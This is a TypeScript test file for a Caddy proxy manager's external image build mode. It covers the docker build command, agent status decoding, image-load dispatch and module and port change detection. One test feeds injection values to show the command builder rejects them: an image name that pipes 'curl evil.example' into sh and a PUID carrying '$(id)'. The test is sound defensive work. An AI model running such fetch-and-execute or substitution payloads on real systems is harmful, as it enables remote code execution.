/** External build mode: what the panel tells an operator to run, and who a load is sent to. */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import {
  AgentDecodeError,
  type AgentStatus,
  decodeAgentStatus,
  SHIPPED_CADDY_MODULES,
} from '@cpm/shared';
import {
  caddyImageBuildCommand,
  caddyImageSourceRef,
  caddyImageTag,
  SUGGESTED_CADDY_IMAGE,
} from '@/src/lib/caddy/image-build/image';
import { caddyBuildAgents, requestCaddyImageLoad } from '@/src/lib/agent/client';
import { modulesChanged, portsReapplied } from '@/src/lib/agent/module-change';
import { attach, recordStatus, resetRegistry, settleResults } from '@/src/lib/agent/registry';

const status = (patch: Partial<AgentStatus['caddyBuild']> = {}, capabilities = ['caddy-image']) =>
  ({
    agentId: 'a1',
    version: '3.3.0',
    mode: 'standalone',
    composeProject: 'cpm',
    l4Ports: { applied: [], status: { state: 'idle' } },
    caddyBuild: { applied: [], status: { state: 'idle' }, ...patch },
    services: { applied: null, status: { state: 'idle' } },
    analytics: { enabled: false, accessLogPresent: false },
    capabilities,
  }) as AgentStatus;

const EXTERNAL = { image: 'registry.example/caddy:custom', puid: '1000', pgid: '1000' };

describe('the build command', () => {
  const modules = ['github.com/caddy-dns/cloudflare', 'github.com/mholt/caddy-l4'];

  it('builds this release from its tag, with the selection and the host ids', () => {
    expect(caddyImageBuildCommand({ modules, ...EXTERNAL, version: '3.3.0' })).toBe(
      [
        'docker build \\',
        '  -f docker/caddy/Dockerfile \\',
        '  --build-arg CADDY_MODULES="',
        '    github.com/caddy-dns/cloudflare github.com/mholt/caddy-l4" \\',
        '  --build-arg PUID=1000 --build-arg PGID=1000 \\',
        '  -t registry.example/caddy:custom \\',
        '  https://github.com/SilentSpud/caddy-proxy-manager.git#v3.3.0',
      ].join('\n'),
    );
  });

  it('splits to the same CADDY_MODULES in a real shell, which build.sh word-splits', async () => {
    // Seven: three full lines' worth would hide a dropped remainder.
    const many = Array.from({ length: 7 }, (_, index) => `github.com/o/m${index}`);
    const command = caddyImageBuildCommand({ modules: many, ...EXTERNAL, version: '3.3.0' });
    expect(command).toContain('    github.com/o/m6" \\');
    // The --build-arg line through the closing quote, as an assignment the shell evaluates.
    const start = command.indexOf('CADDY_MODULES="');
    const end = command.indexOf('"', start + 'CADDY_MODULES="'.length) + 1;
    const assignment = command.slice(start, end);
    const shell = Bun.spawn([
      'sh',
      '-c',
      `${assignment}\nfor spec in $CADDY_MODULES; do echo "$spec"; done`,
    ]);
    expect((await new Response(shell.stdout).text()).trim().split('\n')).toEqual(many);
  });

  it('passes an empty module list as an empty argument', () => {
    expect(caddyImageBuildCommand({ modules: [], ...EXTERNAL })).toContain(
      '  --build-arg CADDY_MODULES="" \\',
    );
  });

  it('builds from main when this is not a release', () => {
    expect(caddyImageSourceRef('unknown')).toBe('main');
    expect(caddyImageSourceRef('3.3.0-rc.2')).toBe('v3.3.0-rc.2');
  });

  it('suggests a tag of its own while the agent still runs the shipped image', () => {
    // Built under the shipped name, the load's pull would put the registry's copy back.
    expect(caddyImageTag('ghcr.io/silentspud/caddy-proxy-manager/caddy:3.3.0')).toBe(
      SUGGESTED_CADDY_IMAGE,
    );
    expect(caddyImageTag(null)).toBe(SUGGESTED_CADDY_IMAGE);
    expect(caddyImageTag('localhost:5000/cpm/caddy:v2')).toBe('localhost:5000/cpm/caddy:v2');
  });

  it('never pastes what an agent reports into a shell unchecked', () => {
    const command = caddyImageBuildCommand({
      modules,
      image: 'caddy:x; curl evil.example | sh',
      puid: '0 --build-arg X=$(id)',
      pgid: '',
    });
    expect(command).toContain(`-t ${SUGGESTED_CADDY_IMAGE}`);
    expect(command).toContain('--build-arg PUID=10000 --build-arg PGID=10000');
    expect(command).not.toContain('evil');
    expect(command).not.toContain('$(id)');
  });
});

describe('the status an external agent sends', () => {
  it('is decoded, and bounded like the rest', () => {
    expect(decodeAgentStatus(status({ external: EXTERNAL })).caddyBuild.external).toEqual(EXTERNAL);
    expect(decodeAgentStatus(status()).caddyBuild.external).toBeUndefined();
    expect(() =>
      decodeAgentStatus(status({ external: { ...EXTERNAL, puid: '1'.repeat(64) } })),
    ).toThrow(AgentDecodeError);
  });
});

describe('who loads an image', () => {
  beforeEach(() => resetRegistry());
  afterEach(() => resetRegistry());

  function connect(agentRowId: number, agentStatus: AgentStatus) {
    const agentId = `image-${crypto.randomUUID()}`;
    const attached = attach({
      agentId,
      agentRowId,
      name: `edge-${agentRowId}`,
      controllerId: 'c',
      controllerName: 'CPM',
      initialState: {} as Parameters<typeof attach>[0]['initialState'],
    });
    recordStatus(agentId, { ...agentStatus, agentId });
    return { agentId, ...attached };
  }

  it('is only an agent in external mode that lists the capability', () => {
    connect(1, status({ external: EXTERNAL }));
    connect(2, status());
    // An agent reporting the field without the command would never answer it.
    connect(3, status({ external: EXTERNAL }, []));

    const fleet = caddyBuildAgents();
    expect(fleet.external.map((agent) => agent.agentRowId)).toEqual([1]);
    expect(fleet.builders).toBe(2);
    expect(caddyBuildAgents(1)).toMatchObject({ builders: 0, external: [{ agentRowId: 1 }] });
    expect(caddyBuildAgents(2)).toEqual({ external: [], builders: 1 });
  });

  it('sends that agent a caddy-image-load and reports its answer', async () => {
    const { agentId, events } = connect(1, status({ external: EXTERNAL }));
    const pending = requestCaddyImageLoad();
    for (let step = await events.next(); !step.done; step = await events.next()) {
      if (step.value.type !== 'command') continue;
      const command = step.value.command as { id: string; kind: string };
      expect(command.kind).toBe('caddy-image-load');
      settleResults(agentId, [
        { id: command.id, ok: true, response: { status: 200, text: '', headers: {} } },
      ]);
      break;
    }
    expect(await pending).toEqual([{ agent: 'edge-1', ok: true, value: null }]);
  });
});

describe('a changed module set', () => {
  it('is what re-applies config, not a first report or the same set reordered', () => {
    const l4 = 'github.com/mholt/caddy-l4';
    const waf = 'github.com/corazawaf/coraza-caddy/v2';
    expect(modulesChanged(null, status({ applied: [l4] }))).toBe(false);
    expect(modulesChanged(status({ applied: [l4, waf] }), status({ applied: [waf, l4] }))).toBe(
      false,
    );
    expect(modulesChanged(status({ applied: [l4, waf] }), status({ applied: [l4] }))).toBe(true);
    // Never rebuilt is the shipped set, so reporting that set explicitly changes nothing.
    expect(
      modulesChanged(status({ applied: null }), status({ applied: [...SHIPPED_CADDY_MODULES] })),
    ).toBe(false);
  });
});

// A config sent while a port change recreated Caddy never reached the new container.
describe('a finished port change', () => {
  const ports = (l4Ports: AgentStatus['l4Ports']['status']) =>
    ({ ...status(), l4Ports: { applied: [], status: l4Ports } }) as AgentStatus;
  const applied = (appliedAt: string) => ports({ state: 'applied', appliedAt });

  it('re-applies config once per new apply, not on a first report or while it runs', () => {
    expect(portsReapplied(null, applied('2026-09-30T00:00:00Z'))).toBe(false);
    expect(portsReapplied(ports({ state: 'idle' }), ports({ state: 'applying' }))).toBe(false);
    expect(portsReapplied(ports({ state: 'applying' }), applied('2026-09-30T00:00:00Z'))).toBe(
      true,
    );
    expect(portsReapplied(applied('2026-09-30T00:00:00Z'), applied('2026-09-30T00:00:00Z'))).toBe(
      false,
    );
    expect(portsReapplied(applied('2026-09-30T00:00:00Z'), applied('2026-09-30T00:05:00Z'))).toBe(
      true,
    );
    expect(portsReapplied(ports({ state: 'idle' }), ports({ state: 'failed' }))).toBe(false);
  });
});
